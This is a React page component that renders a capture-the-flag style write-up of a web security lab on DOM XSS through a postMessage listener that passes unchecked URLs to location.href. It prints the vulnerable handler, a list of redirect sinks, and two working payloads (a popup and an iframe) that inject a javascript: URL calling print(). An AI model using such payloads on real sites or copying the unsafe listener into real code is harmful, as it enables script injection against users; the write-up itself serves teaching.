import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const dom_xss_using_web_messages_and_a_javascript_url = () => {
    const syntax_1 = `
    <script>
        window.addEventListener('message', function(e) {
            var url = e.data;
            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                location.href = url;
            }
        }, false);
    </script>`

    const syntax_2 = `
    "http://test.com".indexOf("http:")
    0
    
    "//test.com".indexOf("http:")
    -1`

    const syntax_3 = `
    location
    location.host
    location.hostname
    location.href
    location.pathname
    location.search
    location.protocol
    location.assign()
    location.replace()
    open()
    element.srcdoc
    XMLHttpRequest.open()
    XMLHttpRequest.send()
    jQuery.ajax()
    $.ajax()`

    const syntax_4 = `
    <script>
    window.pwned=window.open('https://[LAB_ID].web-security-academy.net/')
    window.pwned.postMessage('javascript:print()//http:','*')
    </script>`

    const syntax_5 = `
    <iframe src="https://[LAB_ID].web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
    `
    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                    DOM XSS using web messages and a JavaScript URL
                    </Typography>
                    <pre>2023/08/01 5:52PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Description
                    </Typography>
                    <Typography>
                    This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    This lab involves using post messages. This chrome extension is amazing and should be used when hunting for bugs. - https://github.com/fransr/postMessage-tracker. The extension monitors `postMessage listeners` by showing an indicator about the amount of listeners in the current window.
                    </Typography>
                    <Typography mt={6} variant="h5">
                        Getting Started
                    </Typography>
                    <Typography>
                    When the page we can see that the chrome extension indicates that there is 1 post message listener in the current window.
                    </Typography>
                    <img src="/dom_xss_1.png" style={{width: "100%", height: "100%"}} />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Vulnerability
                    </Typography>
                    <Typography>
                    From the extension we can see that the `postMessage-listener` is on line 50 with the following code being called.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="html">
                        {syntax_1}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    The code is taking the `postMessage` data and giving it to the variable `url`. The variable is then being checked to `http:` or `https:` is in the string. If `http:` or `https:` is in the string then set the `localtion.href` to the variable.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_2}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Exploit
                    </Typography>
                    <Typography>
                    The following sinks can lead to DOM-based open-redirect:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_3}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    We have `location.href` taking un-sanitized input from a `postMessage` that we can control, which means that an open redirect is possible.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    Go to the exploit sever and enter the following code in the body:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_4}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    Now, when a user visits our website, a new window will popup and a `postMessage` is going to be sent to the vulnerable website in the context of the victim. This however will not work due to chrome blocking popups.
                    </Typography>
                    <img src="/dom_xss_2.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    Since chrome is blocking popup windows, lets use an `iframe`.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_5}
                    </SyntaxHighlighter>
                    <Box pt={25}/>
                </Typography>
            </Container>
        </Box>
    );
};

export default dom_xss_using_web_messages_and_a_javascript_url;
